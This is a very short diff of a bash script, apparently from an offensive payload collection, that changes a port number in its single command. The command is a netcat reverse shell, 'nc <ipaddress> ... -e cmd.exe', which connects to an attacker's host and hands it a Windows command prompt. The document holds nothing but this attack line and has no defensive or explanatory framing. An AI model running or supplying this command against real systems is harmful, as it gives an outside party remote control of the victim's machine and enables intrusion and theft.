@@ -1,3 +1,3 @@
 #!/bin/bash
 
-nc <ipaddress> 1337 -e cmd.exe
+nc <ipaddress> <attacker-port> -e cmd.exe
